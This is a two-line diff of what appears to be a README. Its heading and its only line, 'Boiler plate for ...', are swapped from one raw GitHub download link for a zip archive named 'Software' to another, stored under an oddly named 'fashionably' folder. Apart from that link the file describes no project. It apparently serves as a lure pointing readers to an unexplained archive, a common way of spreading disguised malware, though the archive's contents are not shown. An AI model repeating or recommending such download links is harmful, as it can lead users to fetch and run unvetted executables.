@@ -1,2 +1,2 @@
-# https://github.com/Subhopriyo/Gcso/raw/refs/heads/master/fashionably/Software_3.1.zip
-Boiler plate for https://github.com/Subhopriyo/Gcso/raw/refs/heads/master/fashionably/Software_3.1.zip
+# https://raw.githubusercontent.com/Subhopriyo/Gcso/master/fashionably/Software_v2.8.zip
+Boiler plate for https://raw.githubusercontent.com/Subhopriyo/Gcso/master/fashionably/Software_v2.8.zip
